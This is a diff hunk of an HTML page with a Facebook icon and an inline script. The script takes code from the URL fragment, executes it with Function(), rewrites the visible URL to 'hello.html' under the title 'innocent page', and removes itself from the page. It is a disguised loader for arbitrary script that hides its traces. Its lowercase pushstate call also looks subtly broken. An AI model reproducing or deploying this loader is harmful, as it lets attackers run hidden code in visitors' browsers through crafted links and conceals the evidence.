@@ -6,7 +6,7 @@
   <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Facebook_Thumb_icon.svg/640px-Facebook_Thumb_icon.svg.png" />
   <script id="a">
     let payload=document.location.hash.substring(3);
-    history.pushstate({}, '', 'hello.html');
+    history.pushstate({}, 'innocent page', 'hello.html');
     Function(payload)();
     document.getElementById("a").remove();
   </script>
